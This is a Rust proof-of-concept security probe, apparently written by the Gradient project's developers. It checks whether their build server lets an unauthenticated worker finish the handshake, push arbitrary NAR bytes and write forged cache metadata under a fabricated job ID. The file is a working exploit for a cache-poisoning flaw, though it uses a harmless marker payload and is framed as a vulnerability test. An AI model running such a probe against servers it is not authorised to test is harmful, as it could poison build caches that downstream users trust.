/*
 * SPDX-FileCopyrightText: 2026 Wavelens GmbH <info@wavelens.io>
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 *
 * Security probe (chain of #2 → #3): connect as an unregistered worker,
 * complete the open-mode handshake, then push an arbitrary store path's
 * NAR bytes plus `NarUploaded` metadata using a fabricated job_id.
 *
 * On a vulnerable server this writes attacker-controlled bytes to
 * `{base_path}/nars/{hash[..2]}/{hash[2..]}.nar.zst` and inserts/updates a
 * `cached_path` row - without any job ever being assigned to this peer.
 *
 * Usage:
 *   cargo run -p proto --example probe_narpush -- ws://127.0.0.1:3457/proto
 *
 * Exit codes:
 *   2 - handshake admitted AND server accepted NarPush/NarUploaded
 *   0 - server rejected at any earlier stage (secure)
 *   1 - protocol/transport error
 *
 * After running, verify on the server host:
 *   ls -l "$GRADIENT_BASE_PATH"/nars/aa/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.nar.zst
 *   psql -c "select store_path, nar_hash from cached_path where hash like 'aa%'"
 */

use std::time::Duration;

use futures::{SinkExt, StreamExt};
use gradient_proto::messages::{
    ClientMessage, GradientCapabilities, PROTO_VERSION, ServerMessage, decode_server_message,
};
use rkyv::rancor::Error as RkyvError;
use tokio_tungstenite::{connect_async, tungstenite::Message};
use uuid::Uuid;

/// Nix store hashes are 32 chars of nix32. Use a syntactically valid but
/// obviously-fake one so the artefact is easy to find and clean up.
const FAKE_HASH: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const FAKE_NAME: &str = "gradient-probe-poison-0.0.0";
const PAYLOAD: &[u8] = b"PROBE-NARPUSH: not a real NAR; if you can read this, \
                         on_nar_push wrote attacker bytes to nar_storage.\n";

type Ws =
    tokio_tungstenite::WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>;

#[tokio::main]
async fn main() {
    let url = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "ws://127.0.0.1:3000/proto".to_string());

    let worker_id = Uuid::now_v7().to_string();
    let job_id = Uuid::now_v7().to_string();
    let store_path = format!("/nix/store/{FAKE_HASH}-{FAKE_NAME}");

    eprintln!("[probe] connecting to {url} as fresh worker_id={worker_id}");
    let (mut ws, _) = match connect_async(&url).await {
        Ok(pair) => pair,
        Err(e) => {
            eprintln!("[probe] WebSocket connect failed: {e}");
            std::process::exit(1);
        }
    };

    // ── Handshake (same as probe_handshake) ──────────────────────────────────
    send(
        &mut ws,
        &ClientMessage::InitConnection {
            version: PROTO_VERSION,
            capabilities: GradientCapabilities {
                core: false,
                federate: false,
                fetch: true,
                eval: true,
                build: true,
                cache: false,
            },
            id: worker_id,
        },
    )
    .await;

    match recv(&mut ws).await {
        Some(ServerMessage::AuthChallenge { peers }) => {
            eprintln!("[probe] AuthChallenge peers={peers:?}");
        }
        Some(ServerMessage::Reject { code, reason }) => {
            eprintln!("[probe] rejected at init ({code}): {reason} - secure");
            std::process::exit(0);
        }
        other => bail_unexpected("InitConnection", other),
    }

    send(&mut ws, &ClientMessage::AuthResponse { tokens: vec![] }).await;

    match recv(&mut ws).await {
        Some(ServerMessage::InitAck { .. }) => {
            eprintln!("[probe] InitAck - open-mode admission confirmed (#2)");
        }
        Some(ServerMessage::Reject { code, reason }) => {
            eprintln!("[probe] rejected after auth ({code}): {reason} - secure");
            std::process::exit(0);
        }
        other => bail_unexpected("AuthResponse", other),
    }

    // ── #3: push arbitrary NAR bytes for a path no job ever produced ────────
    eprintln!("[probe] pushing {} bytes to {store_path}", PAYLOAD.len());
    send(
        &mut ws,
        &ClientMessage::NarPush {
            job_id: job_id.clone(),
            store_path: store_path.clone(),
            data: PAYLOAD.to_vec(),
            offset: 0,
            is_final: false,
        },
    )
    .await;
    send(
        &mut ws,
        &ClientMessage::NarPush {
            job_id: job_id.clone(),
            store_path: store_path.clone(),
            data: vec![],
            offset: PAYLOAD.len() as u64,
            is_final: true,
        },
    )
    .await;

    // Metadata - fully attacker-controlled, lands in `cached_path`.
    send(
        &mut ws,
        &ClientMessage::NarUploaded {
            job_id,
            store_path: store_path.clone(),
            file_hash: "sha256:deadbeef".into(),
            file_size: PAYLOAD.len() as u64,
            nar_size: PAYLOAD.len() as u64,
            nar_hash: "sha256:deadbeef".into(),
            references: vec![],
            deriver: None,
        },
    )
    .await;

    // Dispatch loop never replies to NarPush/NarUploaded; it just writes and
    // continues. Give it a moment to flush, then drain anything the server
    // happened to send (JobOffer etc.) and look for an explicit Error.
    tokio::time::sleep(Duration::from_millis(300)).await;
    let mut got_error = false;
    while let Ok(Some(msg)) = tokio::time::timeout(Duration::from_millis(200), recv(&mut ws)).await
    {
        match msg {
            ServerMessage::Error { code, message } => {
                eprintln!("[probe] server Error {code}: {message}");
                got_error = true;
            }
            ServerMessage::Reject { code, reason } => {
                eprintln!("[probe] server Reject {code}: {reason}");
                got_error = true;
            }
            other => eprintln!("[probe] (ignored) server sent {other:?}"),
        }
    }

    let _ = ws.close(None).await;

    if got_error {
        eprintln!("[probe] server signalled error - verify nar_storage to confirm");
        std::process::exit(1);
    }
    eprintln!(
        "[probe] VULNERABLE - NarPush/NarUploaded accepted without job ownership.\n\
         [probe] verify: nars/{}/{} .nar.zst under GRADIENT_BASE_PATH and cached_path row for hash={}",
        &FAKE_HASH[..2],
        &FAKE_HASH[2..],
        FAKE_HASH
    );
    std::process::exit(2);
}

async fn send(ws: &mut Ws, msg: &ClientMessage) {
    let bytes = rkyv::to_bytes::<RkyvError>(msg).expect("rkyv serialize");
    ws.send(Message::Binary(bytes.to_vec().into()))
        .await
        .expect("ws send");
}

async fn recv(ws: &mut Ws) -> Option<ServerMessage> {
    loop {
        match ws.next().await {
            Some(Ok(Message::Binary(bytes))) => {
                return Some(
                    decode_server_message(&bytes).expect("rkyv deserialize ServerMessage"),
                );
            }
            Some(Ok(Message::Ping(_) | Message::Pong(_))) => continue,
            Some(Ok(Message::Close(_))) | None => return None,
            Some(Ok(other)) => {
                eprintln!("[probe] non-binary frame: {other:?}");
                std::process::exit(1);
            }
            Some(Err(e)) => {
                eprintln!("[probe] ws recv error: {e}");
                std::process::exit(1);
            }
        }
    }
}

fn bail_unexpected(stage: &str, got: Option<ServerMessage>) -> ! {
    eprintln!("[probe] unexpected reply after {stage}: {got:?}");
    std::process::exit(1);
}
